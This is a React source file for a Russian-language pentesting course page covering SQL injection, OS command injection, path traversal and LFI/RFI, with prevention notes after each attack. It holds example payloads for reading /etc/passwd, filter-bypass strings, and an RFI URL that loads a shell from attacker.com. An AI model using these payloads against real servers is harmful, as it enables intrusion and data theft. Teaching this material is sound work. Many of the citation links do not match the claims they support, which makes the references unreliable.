import { ContentPageLayout, P, Ul, H2, H3 } from '@/components/content/ContentPageLayout';
import { Database, Terminal, FileCode, UploadCloud } from 'lucide-react';

// Placeholder for TableComponent as it's not defined in the prompt context for ContentPageLayout
// If you have a TableComponent, you can use it. Otherwise, this is a simplified rendering.
const SimpleTable = ({ headers, rows }: { headers: string[], rows: string[][] }) => (
  <div className="overflow-x-auto my-6">
    <table className="min-w-full divide-y divide-border bg-card shadow-md rounded-lg">
      <thead className="bg-muted/50">
        <tr>
          {headers.map(header => (
            <th key={header} scope="col" className="px-6 py-3 text-left text-xs font-medium text-muted-foreground uppercase tracking-wider">
              {header}
            </th>
          ))}
        </tr>
      </thead>
      <tbody className="bg-card divide-y divide-border">
        {rows.map((row, rowIndex) => (
          <tr key={rowIndex} className="hover:bg-muted/30">
            {row.map((cell, cellIndex) => (
              <td key={cellIndex} className="px-6 py-4 whitespace-nowrap text-sm text-foreground">
                {cell}
              </td>
            ))}
          </tr>
        ))}
      </tbody>
    </table>
  </div>
);

export default function ModuleFourPage() {
  const sqlInjectionTableHeaders = ["Тип SQLi", "Индикатор Обнаружения", "Ключевая Техника Эксплуатации", "Инструменты"];
  const sqlInjectionTableRows = [
    ["Error-based (In-band)", "Сообщения об ошибках БД в ответе приложения", "Извлечение данных из текста ошибки", "Ручной/Burp, sqlmap"],
    ["UNION-based (In-band)", "Данные из других таблиц добавляются к ответу", "UNION SELECT для объединения запросов", "Ручной/Burp, sqlmap"],
    ["Boolean-based (Blind)", "Разница в ответе приложения (True/False)", "Условная логика (AND 1=1/AND 1=2) для посимвольного извлечения", "Ручной/Burp, sqlmap"],
    ["Time-based (Blind)", "Задержка времени ответа сервера", "Условная задержка (WAITFOR, SLEEP) для посимвольного извлечения", "Ручной/Burp, sqlmap"],
    ["Out-of-Band (OOB) (Blind)", "Внешнее сетевое взаимодействие (DNS, HTTP) с сервера БД", "Инициирование OOB-канала для прямой эксфильтрации данных", "Burp Collaborator, sqlmap"]
  ];

  return (
    <ContentPageLayout
      title="Модуль IV: Атака на Серверные Уязвимости"
    >
      <H2><Database className="inline-block mr-2 h-6 w-6 text-primary" />A. SQL-инъекции (SQLi)</H2>
      <P>
        Этот раздел глубоко погружается в одну из самых известных и опасных веб-уязвимостей, следуя подходу WAHH2. SQL-инъекции позволяют атакующему вмешиваться в запросы, которые приложение отправляет своей базе данных.{' '}
        <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">55</a>
      </P>
      
      <H3>Обнаружение SQLi:</H3>
      <Ul items={[
        <>
          На основе ошибок (Error-based): Приложение возвращает сообщения об ошибках базы данных в ответ на некорректный ввод, что может раскрыть структуру запроса или даже данные.{' '}
          <a href="https://github.com/IamCarron/DVWA-Script" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">130</a>{' '}
          <a href="https://portswigger.net/web-security/sql-injection/lab-visible-error-based" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">Лаборатория</a>.{' '}
          <a href="https://www.youtube.com/watch?v=0vIPUKK_8qs" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">14</a>
        </>,
        <>
          На основе логики (Boolean-based): Приложение не показывает ошибки, но его ответ меняется в зависимости от того, истинно или ложно условие, внедренное атакующим (например, AND '1'='1 или AND '1'='2).{' '}
          <a href="https://github.com/IamCarron/DVWA-Script" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">130</a>{' '}
          <a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">Лаборатория</a>.{' '}
          <a href="https://www.youtube.com/watch?v=0vIPUKK_8qs" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">14</a>
        </>,
        <>
          На основе времени (Time-based): Приложение не показывает ни ошибок, ни разницы в ответах, но атакующий может внедрить команду, вызывающую задержку выполнения запроса (например, WAITFOR DELAY '0:0:5' или pg_sleep(5)), и измерять время ответа сервера.{' '}
          <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">130</a>{' '}
          <a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">Лаборатории</a>.{' '}
          <a href="https://www.youtube.com/watch?v=0vIPUKK_8qs" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">14</a>
        </>
      ]} />
      
      <H3>Техники Эксплуатации:</H3>
      <Ul items={[
        <>
          UNION-атаки: Используется оператор UNION для объединения результатов исходного запроса с результатами запроса, контролируемого атакующим. Это позволяет извлекать данные из других таблиц.{' '}
          <a href="https://www.youtube.com/watch?v=0vIPUKK_8qs" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">131</a>{' '}
          Требует определения количества и типов столбцов в исходном запросе.{' '}
          <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">Лаборатории</a>.{' '}
          <a href="https://www.youtube.com/watch?v=0vIPUKK_8qs" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">14</a>
        </>,
        <>
          Эксплуатация Blind SQLi: Систематический перебор символов или битов данных с использованием условных запросов (Boolean-based или Time-based) для посимвольного извлечения информации.{' '}
          <a href="https://github.com/IamCarron/DVWA-Script" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">130</a>
        </>,
        <>
          Out-of-Band (OOB) SQLi: Инициирование внешнего сетевого взаимодействия (например, DNS-запроса или HTTP-запроса) с сервера базы данных на систему, контролируемую атакующим, для прямой эксфильтрации данных.{' '}
          <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">130</a>{' '}
          <a href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">Лаборатории</a>.{' '}
          <a href="https://www.youtube.com/watch?v=0vIPUKK_8qs" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">14</a>
        </>
      ]} />

      <H3>Автоматизация с sqlmap:</H3>
      <P>
        Знакомство с инструментом {' '}
        <a href="https://users.ece.cmu.edu/~dbrumley/courses/18487-f13/powerpoint/17-web-security1.pdf" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">sqlmap 134</a>{' '}
        для автоматизации обнаружения и эксплуатации SQLi.{' '}
        <a href="https://tryhackme.com/room/httpindetail" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">135</a>{' '}
        Рассмотрение основных опций: указание URL (<code>-u</code>), данных POST (<code>--data</code>), cookies (<code>--cookie</code>), перечисление баз данных (<code>--dbs</code>), таблиц (<code>--tables</code>), столбцов (<code>--columns</code>), извлечение данных (<code>--dump</code>), определение текущего пользователя/БД (<code>--current-user</code>, <code>--current-db</code>).{' '}
        <a href="https://users.ece.cmu.edu/~dbrumley/courses/18487-f13/powerpoint/17-web-security1.pdf" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">134</a>{' '}
        Обсуждение работы sqlmap с различными типами SQLi, включая blind.{' '}
        <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">43</a>
      </P>

      <H3>Предотвращение:</H3>
      <P>
        Основные методы защиты: использование параметризованных запросов (Prepared Statements){' '}
        <a href="https://tryhackme.com/p/westwardfishd" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">143</a>, 
        хранимых процедур (с осторожностью){' '}
        <a href="https://www.uscyberrange.org/wp-content/uploads/2023/02/3_SQL-Injection-lab.pdf" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">143</a>, 
        валидация ввода по принципу "белого списка"{' '}
        <a href="https://www.uscyberrange.org/wp-content/uploads/2023/02/3_SQL-Injection-lab.pdf" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">143</a>, 
        экранирование пользовательского ввода (менее надежно).{' '}
        <a href="https://www.uscyberrange.org/wp-content/uploads/2023/02/3_SQL-Injection-lab.pdf" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">143</a>
      </P>
      <P>
        SQL-инъекции остаются одной из самых критичных и распространенных уязвимостей.{' '}
        <a href="https://portswigger.net/" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">29</a>{' '}
        Их эксплуатация может привести к полной компрометации базы данных и сервера. Глубокое понимание различных техник эксплуатации (UNION, Blind, OOB){' '}
        <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">130</a>{' '}
        и умение работать с автоматизированными инструментами, такими как {' '}
        <a href="https://users.ece.cmu.edu/~dbrumley/courses/18487-f13/powerpoint/17-web-security1.pdf" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">sqlmap 135</a>, 
        являются обязательными навыками для пентестера. Важно сначала понять ручные методы{' '}
        <a href="https://github.com/khangtictoc/DVWA_ModSecurity_Deployment" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">31</a>, 
        прежде чем полностью полагаться на автоматизацию.
      </P>
      
      <H3>Таблица: Типы SQL-инъекций и Методы Обнаружения/Эксплуатации</H3>
      <SimpleTable headers={sqlInjectionTableHeaders} rows={sqlInjectionTableRows} />

      <H2><Terminal className="inline-block mr-2 h-6 w-6 text-primary" />B. Внедрение Команд ОС (OS Command Injection)</H2>
      <P>
        Эта уязвимость позволяет атакующему выполнять произвольные команды операционной системы на сервере, на котором работает приложение.{' '}
        <a href="https://tryhackme.com/room/webapplicationbasics" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">38</a>
      </P>
      <H3>Механизм Атаки:</H3>
      <P>Возникает, когда приложение передает непроверенные пользовательские данные (например, из формы или URL) в системную команду. Атакующий использует метасимволы командной оболочки (например, <code>;</code>, <code>|</code>, <code>&&</code>, <code>`</code>) для внедрения собственных команд.</P>
      <P>Примеры Пейлоадов:</P>
      <Ul items={[
        <><code>127.0.0.1; ls -la</code> (выполнить ls -la после ping).{' '} <a href="https://tryhackme.com/room/webapplicationbasics" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">38</a></>,
        <><code>127.0.0.1 | cat /etc/passwd</code> (передать вывод ping в cat)</>,
        <><code>127.0.0.1 && id</code> (выполнить id, если ping успешен).{' '} <a href="https://www.youtube.com/watch?v=GmWQ1VIjd2U" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">146</a></>
      ]} />
      <H3>Слепое Внедрение Команд (Blind Command Injection):</H3>
      <P>
        Ситуация, когда вывод внедренной команды не отображается в ответе приложения.{' '}
        <a href="https://cspanias.github.io/posts/DVWA-Insecure-CAPTCHA/" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">39</a>{' '}
        Техники эксплуатации:
      </P>
      <Ul items={[
        <>Временные Задержки: Использование команд типа <code>sleep 10</code> для проверки выполнения по времени ответа.{' '}<a href="https://www.youtube.com/watch?v=0vIPUKK_8qs" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">14</a></>,
        <>Перенаправление Вывода: Запись вывода команды во временный файл в веб-доступной директории (<code>cmd > /var/www/html/output.txt</code>).{' '}<a href="https://www.youtube.com/watch?v=0vIPUKK_8qs" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">14</a></>,
        <>Out-of-Band (OOB) Взаимодействие: Использование команд (<code>nslookup</code>, <code>curl</code>, <code>wget</code>) для отправки данных или установления соединения с сервером атакующего.{' '}<a href="https://www.youtube.com/watch?v=0vIPUKK_8qs" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">14</a></>
      ]} />
      <H3>Предотвращение:</H3>
      <P>
        Избегать вызова системных команд с пользовательским вводом.{' '}
        <a href="https://www.blackhillsinfosec.com/finding-access-control-vulnerabilities-with-autorize/" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">144</a>{' '}
        Использовать встроенные функции языка программирования для выполнения необходимых действий. Если вызов команд необходим, применять строгую валидацию по "белому списку"{' '}
        <a href="https://www.blackhillsinfosec.com/finding-access-control-vulnerabilities-with-autorize/" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">144</a>{' '}
        и экранирование метасимволов. Запускать приложение с минимально необходимыми привилегиями.{' '}
        <a href="https://www.blackhillsinfosec.com/finding-access-control-vulnerabilities-with-autorize/" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">144</a>
      </P>

      <H2><FileCode className="inline-block mr-2 h-6 w-6 text-primary" />C. Обход Пути и Включение Файлов (Path Traversal & LFI/RFI)</H2>
      <P>
        Эти уязвимости позволяют атакующему читать файлы за пределами корневого каталога веб-сервера (Path Traversal) или включать содержимое локальных (LFI) или удаленных (RFI) файлов в ответ приложения.{' '}
        <a href="https://www.youtube.com/watch?v=htTEfokaKsM" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">143</a>
      </P>
      <Ul items={[
        <>
          Обход Пути (Path Traversal): Атакующий манипулирует параметрами, содержащими пути к файлам (например, <code>?file=../../../etc/passwd</code>), чтобы получить доступ к системным файлам.{' '}
          <a href="https://www.youtube.com/watch?v=0vIPUKK_8qs" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">39</a>{' '}
          Используются последовательности <code>../</code> или <code>..\\</code>.
        </>,
        <>
          Локальное Включение Файлов (LFI - Local File Inclusion): Приложение включает содержимое файла, указанного пользователем, в свою страницу.{' '}
          <a href="https://www.youtube.com/watch?v=htTEfokaKsM" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">148</a>{' '}
          Часто сочетается с Path Traversal для чтения произвольных файлов (<code>?page=../../../../etc/passwd</code>). Может использоваться для чтения исходного кода приложения, лог-файлов{' '}
          <a href="https://www.youtube.com/watch?v=YrZaBbSBTes" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">150</a>, файлов конфигурации.
        </>,
        <>
          Удаленное Включение Файлов (RFI - Remote File Inclusion): Приложение включает файл с удаленного URL, указанного пользователем (<code>?page=http://attacker.com/shell.txt</code>).{' '}
          <a href="https://www.youtube.com/watch?v=htTEfokaKsM" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">143</a>{' '}
          Часто приводит к удаленному выполнению кода (RCE), если включенный файл содержит исполняемый код (например, PHP). RFI встречается реже, чем LFI, особенно в современных версиях PHP, где <code>allow_url_include</code> по умолчанию отключен.{' '}
          <a href="https://www.youtube.com/watch?v=htTEfokaKsM" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">143</a>
        </>
      ]} />
      <H3>Техники Обхода Фильтров:</H3>
      <Ul items={[
        "Кодирование: URL-кодирование (<code>%2e%2e%2f</code>), двойное кодирование.",
        "Различные Представления ../: <code>..\\/</code>, <code>..\\</code>, <code>/./</code>, <code>//</code>.",
        <>
          Null Byte (<code>%00</code>): В старых версиях PHP позволял обрезать строку, обходя проверку расширения файла (<code>?file=../../../../etc/passwd%00.jpg</code>).{' '}
          <a href="https://www.youtube.com/watch?v=0vIPUKK_8qs" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">14</a>
        </>,
        <>
          Эксплуатация с PHP Wrappers: Использование оберток PHP, таких как <code>php://filter/convert.base64-encode/resource=</code> для чтения исходного кода PHP файлов, которые иначе были бы выполнены сервером.{' '}
          <a href="https://www.youtube.com/watch?v=YrZaBbSBTes" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">150</a>
        </>
      ]} />
      <H3>Предотвращение:</H3>
      <P>
        Строгая валидация пользовательского ввода, использование "белого списка" разрешенных файлов/путей{' '}
        <a href="https://www.youtube.com/watch?v=YrZaBbSBTes" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">150</a>, 
        хранение идентификаторов файлов в базе данных вместо прямых путей{' '}
        <a href="https://www.indusface.com/blog/" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">152</a>, 
        отключение <code>allow_url_include</code> и <code>allow_url_fopen</code> в PHP для предотвращения RFI.{' '}
        <a href="https://www.uscyberrange.org/wp-content/uploads/2023/02/3_SQL-Injection-lab.pdf" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">143</a>
      </P>

      <H2><UploadCloud className="inline-block mr-2 h-6 w-6 text-primary" />D. Уязвимости Загрузки Файлов</H2>
      <P>
        Небезопасная реализация функции загрузки файлов пользователями может привести к серьезным последствиям, включая выполнение кода на сервере.{' '}
        <a href="https://www.youtube.com/watch?v=0vIPUKK_8qs" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">39</a>
      </P>
      <H3>Механизмы Атаки</H3>
      <P>Дальнейшее содержание этой секции не предоставлено в исходном тексте для этой страницы, но она обозначена.</P>
      
    </ContentPageLayout>
  );
}
